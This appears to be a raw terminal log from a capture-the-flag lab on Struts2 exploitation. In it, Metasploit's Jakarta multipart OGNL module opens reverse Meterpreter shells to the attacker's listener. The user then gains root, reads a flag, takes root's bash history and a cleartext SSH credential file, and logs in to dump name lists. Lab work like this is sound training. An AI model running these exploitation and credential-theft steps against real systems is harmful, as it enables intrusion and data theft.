@@ -1,0 +1,538 @@
+msf5 > search struts2
+
+Matching Modules
+================
+
+   #  Name                                             Disclosure Date  Rank       Check  Description
+   -  ----                                             ---------------  ----       -----  -----------
+   0  exploit/multi/http/struts2_code_exec_showcase    2017-07-07       excellent  Yes    Apache Struts 2 Struts 1 Plugin Showcase OGNL Code Execution
+   1  exploit/multi/http/struts2_content_type_ognl     2017-03-07       excellent  Yes    Apache Struts Jakarta Multipart Parser OGNL Injection
+   2  exploit/multi/http/struts2_namespace_ognl        2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
+   3  exploit/multi/http/struts2_rest_xstream          2017-09-05       excellent  Yes    Apache Struts 2 REST Plugin XStream RCE
+   4  exploit/multi/http/struts_code_exec_classloader  2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
+   5  exploit/multi/http/struts_code_exec_parameters   2011-10-01       excellent  Yes    Apache Struts ParametersInterceptor Remote Code Execution
+   6  exploit/multi/http/struts_dev_mode               2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
+
+
+Interact with a module by name or index, for example use 6 or use exploit/multi/http/struts_dev_mode
+
+msf5 > use exploit/multi/http/struts2_namespace_ognl
+   
+[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
+msf5 exploit(multi/http/struts2_namespace_ognl) > 
+msf5 exploit(multi/http/struts2_namespace_ognl) > show options
+
+Module options (exploit/multi/http/struts2_namespace_ognl):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   ACTION         showcase.action  yes       A valid endpoint that is configured as a redirect action
+   ENABLE_STATIC  true             yes       Enable "allowStaticMethodAccess" before executing OGNL
+   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT          8080             yes       The target port (TCP)
+   SSL            false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI      /                yes       A valid base path to a struts application
+   VHOST                           no        HTTP server virtual host
+
+
+Payload options (linux/x64/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.43.201   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic detection
+
+
+msf5 exploit(multi/http/struts2_namespace_ognl) > use exploit/multi/http/struts2_content_type_ognl
+[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
+msf5 exploit(multi/http/struts2_content_type_ognl) > show options
+
+Module options (exploit/multi/http/struts2_content_type_ognl):
+
+   Name       Current Setting     Required  Description
+   ----       ---------------     --------  -----------
+   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      8080                yes       The target port (TCP)
+   SSL        false               no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /struts2-showcase/  yes       The path to a struts application action
+   VHOST                          no        HTTP server virtual host
+
+
+Payload options (linux/x64/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.43.201   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Universal
+
+
+msf5 exploit(multi/http/struts2_content_type_ognl) > set RHOSTS 10.10.17.5
+RHOSTS => 10.10.17.5
+msf5 exploit(multi/http/struts2_content_type_ognl) > set RPORT 80
+RPORT => 80
+msf5 exploit(multi/http/struts2_content_type_ognl) > set TARGETURI /showcase.action
+TARGETURI => /showcase.action
+msf5 exploit(multi/http/struts2_content_type_ognl) > set LHOST 10.8.1.147
+LHOST => 10.8.1.147
+msf5 exploit(multi/http/struts2_content_type_ognl) > run
+
+[*] Started reverse TCP handler on 10.8.1.147:4444 
+[*] Sending stage (3012516 bytes) to 10.10.17.5
+[*] Meterpreter session 1 opened (10.8.1.147:4444 -> 10.10.17.5:41300) at 2020-08-02 11:54:36 +0530
+
+meterpreter > show options
+[-] Unknown command: show.
+meterpreter > script -qc /bin/bash /dev/null
+[-] Unknown command: script.
+meterpreter > 
+[*] 10.10.17.5 - Meterpreter session 1 closed.  Reason: Died
+shell
+[-] Unknown command: shell.
+msf5 exploit(multi/http/struts2_content_type_ognl) > run
+
+[*] Started reverse TCP handler on 10.8.1.147:4444 
+[*] Sending stage (3012516 bytes) to 10.10.17.5
+[*] Meterpreter session 2 opened (10.8.1.147:4444 -> 10.10.17.5:41304) at 2020-08-02 11:57:45 +0530
+
+meterpreter > shell
+[-] Unknown command: shell.
+meterpreter > set LHOST 10.8.12.43
+[-] Unknown command: set.
+meterpreter > show options
+[-] Unknown command: show.
+meterpreter > shell
+[-] Unknown command: shell.
+meterpreter > help
+
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bg                        Alias for background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current session
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    secure                    (Re)Negotiate TLV packet encryption on the session
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session.
+    transport                 Change the current transport mechanism
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+meterpreter > exploit
+[-] Unknown command: exploit.
+meterpreter > shell
+[-] Unknown command: shell.
+meterpreter > exit
+[*] Shutting down Meterpreter...
+
+[*] 10.10.17.5 - Meterpreter session 2 closed.  Reason: User exit
+msf5 exploit(multi/http/struts2_content_type_ognl) > set LHOSTS 10.8.12.43
+LHOSTS => 10.8.12.43
+msf5 exploit(multi/http/struts2_content_type_ognl) > exploit
+
+[*] Started reverse TCP handler on 10.8.1.147:4444 
+[*] Sending stage (3012516 bytes) to 10.10.17.5
+[*] Meterpreter session 3 opened (10.8.1.147:4444 -> 10.10.17.5:41426) at 2020-08-02 12:00:30 +0530
+
+script -qc /bin/bash /dev/null
+root@f9eebb7d14d5:/usr/local/tomcat# uname -a
+uname -a
+Linux f9eebb7d14d5 4.14.146-93.123.amzn1.x86_64 #1 SMP Tue Sep 24 00:45:23 UTC 2019 x86_64 GNU/Linux
+root@f9eebb7d14d5:/usr/local/tomcat# 
+root@f9eebb7d14d5:/usr/local/tomcat# find / -name "*[Ff][Ll][Aa][Gg]1*" 2>/dev/null
+<l/tomcat# find / -name "*[Ff][Ll][Aa][Gg]1*" 2>/dev/null                    
+/usr/local/tomcat/webapps/ROOT/ThisIsFlag1.txt
+root@f9eebb7d14d5:/usr/local/tomcat# cat /usr/local/tomcat/webapps/ROOT/ThisIsFlag1.txt
+<l/tomcat# cat /usr/local/tomcat/webapps/ROOT/ThisIsFlag1.txt                
+THM{3ad96bb13ec963a5ca4cb99302b37e12}
+root@f9eebb7d14d5:/usr/local/tomcat# 
+oot@f9eebb7d14d5:~# cd /root/
+cd /root/
+root@f9eebb7d14d5:~# ls -la
+ls -la
+total 36
+drwx------ 1 root root 4096 Dec  8  2019 .
+drwxr-xr-x 1 root root 4096 Aug  1 06:02 ..
+-rw------- 1 root root  623 Dec  8  2019 .bash_history
+-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
+drwx------ 1 root root 4096 Jul  4  2017 .gnupg
+-rw-r--r-- 1 root root  140 Nov 19  2007 .profile
+drwxr-xr-x 2 root root 4096 Dec  8  2019 .vim
+-rw------- 1 root root 8163 Dec  8  2019 .viminfo
+root@f9eebb7d14d5:~# cat .bash_history
+cat .bash_history
+apt install vim
+apt update
+apt install vim
+ls
+cd webapps/
+ls -la
+cd ROOT
+ls -la
+cd WEB-INF/
+ls
+cd ../META-INF/
+ls
+cd ../WEB-INF/
+ls
+ls -la
+vi decorators
+cd decorators
+ls
+ls -la
+vim main.jsp 
+vim main.jsp 
+cd ../../
+ls
+ls -la
+vim showcase.jsp 
+vim showcase.jsp 
+cd images/
+wget http://d21c.com/santa/santa/list-santa.gif
+ls
+cd ../
+vim showcase.jsp 
+ls -la
+cd /home/
+ls
+mkdir santa
+ls -la
+cd santa/
+ls -la
+cd ../
+cd santa/
+vim ssh-creds.txt
+cd ../
+ls -la
+cd santa/
+ls
+cat ssh-creds.txt 
+cd /usr/local/tomcat/webapps/
+ls
+ls -la
+cd ROOT
+ls -la
+vim ThisIsFlag1.txt
+cd /home
+ls
+cd santa/
+ls
+ls -la
+cat ssh-creds.txt 
+ls -la
+exit
+
+
+
+
+
+root@f9eebb7d14d5:~# find / -name "ssh-creds.txt"
+find / -name "ssh-creds.txt"
+/home/santa/ssh-creds.txt
+root@f9eebb7d14d5:~# cat /home/santa/ssh-creds.txt
+cat /home/santa/ssh-creds.txt
+santa:rudolphrednosedreindeer
+
+[santa@ip-10-10-17-5 ~]$ ls
+naughty_list.txt  nice_list.txt
+
+[santa@ip-10-10-17-5 ~]$ cat  -n  naughty_list.txt
+     1	Cletus Amerman
+     2	Allene Hirsh
+     3	Trevor Alred
+     4	Barbar Twersky
+     5	Royal Coday
+     6	Sonja Justus
+     7	Gilda Horn
+     8	Arianne Delucca
+     9	Lazaro Rutter
+    10	Tena Kayser
+    11	Jin Mcnichol
+    12	Tawana Eaglin
+    13	Collette Guess
+    14	Ronny Mcphearson
+    15	Lynell Bibee
+    16	Monnie Vahle
+    17	Melani Shellenbarger
+    18	Trisha Hotaling
+    19	Candance Drescher
+    20	Jeremiah Degroat
+    21	Evangeline Butterfield
+    22	Vikki Bengtson
+    23	Jesusita Rostad
+    24	Brinda Twellman
+    25	Mitzie Cheever
+    26	Kraig Vath
+    27	Torri Fraley
+    28	Bettyann Stowe
+    29	Kasi Trammell
+    30	Lizabeth Driver
+    31	Kathyrn Upton
+    32	Theola Thomason
+    33	Maribel Coomer
+    34	Teresia Nastasi
+    35	Gisele Bastin
+    36	Juana Noonkester
+    37	Tanisha Dellinger
+    38	Morton Cabaniss
+    39	Maurita Leister
+    40	Katerine Spang
+    41	Nena Saeger
+    42	Karry Ravelo
+    43	Prince Ericksen
+    44	Allyson Brazier
+    45	Lidia Dykes
+    46	Lorna Waybright
+    47	Wade Rudasill
+    48	Jacqulyn Bevilacqua
+    49	Merrilee Finney
+    50	Vito Resnick
+    51	Thaddeus Jacks
+    52	Phuong Schiefelbein
+    53	Reyna Turman
+    54	Mirta Eslinger
+    55	Idell Lapointe
+    56	Elsie Clement
+    57	Eun Ben
+    58	Charles Hubbell
+    59	Camille Helland
+    60	Elaina Mcglaughlin
+    61	Margery Mattos
+    62	Otilia Cordes
+    63	Janelle Pelzer
+    64	Brittany Golub
+    65	Shenita Linhart
+    66	Aja Dunfee
+    67	Claretha Gaunt
+    68	Kelsi Rodriquez
+    69	Latosha Hassinger
+    70	Judy Ullery
+    71	Sherly Gutierrez
+    72	Mitsuko Conner
+    73	Ernestine Depuy
+    74	Maddie Hughley
+    75	Abby Mayton
+    76	Lucila Vrabel
+    77	Chaya Boulanger
+    78	Leopoldo Penhollow
+    79	Ezekiel Cribbs
+    80	Jamee Sheeler
+    81	Garnet Jerkins
+    82	Charity Koelling
+    83	Marilee Fraley
+    84	Starr Charles
+    85	Johnna Lomeli
+    86	Christal Salem
+    87	Shantay Osteen
+    88	Kay Asbury
+    89	Jayne Morano
+    90	Luciano Bomba
+    91	Eileen Gipson
+    92	Meg Maze
+    93	Seema Chevalier
+    94	Mimi Parkins
+    95	Leann Cameron
+    96	Lorretta Coby
+    97	Salley Schutz
+    98	Alba Hess
+    99	Fanny Sica
+   100	Mardell Geib
+   101	Kent Mulhern
+   102	Lai Haake
+   103	Marilu Palmeri
+   104	Sharita Kilcrease
+   105	Marti Hull
+   106	Ute Rampton
+   107	Nikita Flickinger
+   108	Ashlie Kellett
+   109	Joelle Berrios
+   110	Charmaine Auten
+   111	Gus Warlick
+   112	Karyl Fetzer
+   113	Lon Reidhead
+   114	Noriko Draheim
+   115	Nilsa Reddington
+   116	Mika Boyle
+   117	Lelia Killion
+   118	Concepcion Peeples
+   119	Luisa Swilley
+   120	Joann Martinson
+   121	Armanda Wisecarver
+   122	Theresa Funari
+   123	Antony Collyer
+   124	Jesus Height
+   125	Jere Mager
+   126	Beatriz Deakins
+   127	Jamel Watwood
+   128	Kareem Frakes
+   129	Jacques Elmore
+   130	Margery Weatherly
+   131	Glenn Montufar
+   132	Joy Keisler
+   133	Wendy Lair
+   134	Lucas Gravitt
+   135	Malka Burley
+   136	Darleen Rhea
+   137	Mozell Linger
+   138	Shantell Matsumoto
+   139	Garth Arambula
+   140	Lavada Whitlock
+   141	Chance Heisler
+   142	Goldie Kimrey
+   143	Muriel Ariza
+   144	Missy Stiner
+   145	Sanford Geesey
+   146	Jovan Hullett
+   147	Sherlene Loehr
+   148	Melisa Vanhoose
+   149	Sharika Spooner
+[santa@ip-10-10-17-5 ~]$ ls
+naughty_list.txt  nice_list.txt
+[santa@ip-10-10-17-5 ~]$ cat -n  nice_list.txt
+     1	Romana Rossbach
+     2	Krystin Kahler
+     3	Vito Rodrigez
+     4	Malka Cipolla
+     5	Angela Vecchio
+     6	Miriam Sing
+     7	Neta Bogan
+     8	Kathie Bramhall
+     9	Eli Glasco
+    10	Marcell Vanbrunt
+    11	Dorotha Stallworth
+    12	Lamont Yount
+    13	Tomoko Claro
+    14	Bryan Scogin
+    15	Sueann Kish
+    16	Roselee Drumheller
+    17	Claribel Kilgore
+    18	Sharan Jemison
+    19	Estefana Routt
+    20	Rodrick Zurita
+    21	Valerie Sumpter
+    22	Matthew Mancuso
+    23	Enedina Goings
+    24	Fredrick Burbage
+    25	Julee Cresswell
+    26	Coy Huwe
+    27	Mistie Reale
+    28	Adena Spratling
+    29	Lawerence Lucarelli
+    30	Spring Sherer
+    31	Shanel Nino
+    32	Hee Cerutti
+    33	Suzanne Armour
+    34	Delisa Stack
+    35	Karol Booth
+    36	Kent Sabir
+    37	Angella Gambino
+    38	Maude Kravetz
+    39	Leanora Zubia
+    40	Rosanna Delph
+    41	Martin Villalva
+    42	Wai Fricks
+    43	Jerilyn Jonson
+    44	Deanne Collette
+    45	Eugena Debow
+    46	Fe Deckard
+    47	Wally Macko
+    48	Dorothy Menjivar
+    49	Willis Peffer
+    50	Lauran Westhoff
+    51	Jamel Sites
+    52	Lindsey Gaffney
+    53	Karl Etienne
+    54	Alla Abdulla
+    55	Marguerite Vrooman
+    56	Donetta Mckinney
+    57	Londa Boe
+    58	Hannelore Kabel
+    59	Claudie Woltz
+    60	Marilu Summy
+    61	Noma Jaquith
+    62	Gisela Lydon
+    63	Irene Raynor
+    64	Renate Seeman
+    65	Ignacio Whetzel
+    66	Rochelle Rieck
+    67	Rayford Minarik
+    68	Wyatt Dartez
+    69	Boyce Vanriper
+    70	Jann Bates
+    71	Kathline Hindman
+    72	Tess Rumery
+    73	Nadine Binder
+    74	Myron Provenza
+    75	Launa Gwin
+    76	Leatrice Turpin
+    77	Sabrina Karns
+    78	Karly Lorenzo
+    79	Cira Mccay
+    80	Andre Schepis
+    81	Gabriel Youngren
+    82	Lilia Waldrip
+    83	Jesenia Pressley
+    84	Zulema Mcgrory
+    85	Alishia Abadie
+    86	Clementine Wotring
+    87	Maximina Lamer
+    88	Allyson Reich
+    89	Laurine Bryce
+    90	Carmelo Reichel
+    91	Savannah Helsel
+    92	Rossie Nordin
+    93	Glenn Malpass
+    94	Dahlia Bortz
+    95	Denice Wachtel
+    96	Frances Merkle
+    97	Thomasena Latimore
+    98	Laurena Gardea
+    99	Delphine Gossard
+   100	Jaime Victoria
+[santa@ip-10-10-17-5 ~]$ 
+Broadcast message from root@ip-10-10-17-5
+	(unknown) at 6:49 ...
+
+The system is going down for power off NOW!
+Connection to 10.10.17.5 closed by remote host.
+Connection to 10.10.17.5 closed.
